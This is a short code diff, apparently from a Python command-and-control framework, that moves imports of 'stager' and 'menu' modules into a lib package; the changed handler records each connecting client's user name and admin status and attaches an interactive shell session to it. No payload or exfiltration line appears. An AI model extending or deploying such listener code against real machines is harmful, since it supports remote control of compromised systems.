@@ -1,4 +1,4 @@
-from stager import *
+from lib.stager import *
 import threading
 
 amap = {}
@@ -45,7 +45,7 @@ class Handler(asyncore.dispatcher):
             if '[#check#]' in data:
                 self.user_name = "User:" + data.split(':')[0].replace('\x00','').replace('[#check#]','')
                 self.is_admin = "Admin:" + data.split(':')[1].replace('\x00','').replace('[#check#]','')
-                from menu import clientMenuOptions
+                from lib.menu import clientMenuOptions
                 clientMenuOptions[self.server.get_clientnumber()] =  {'payloadchoice': None, 'payload':str(self.getpeername()[0]) + ":" + str(self.getpeername()[1]), 'extrawork': interactShell, 'params': (self.server.get_clientnumber()), 'availablemodules':{self.user_name: '', self.is_admin: ''}}
                 self.in_buffer = []
 
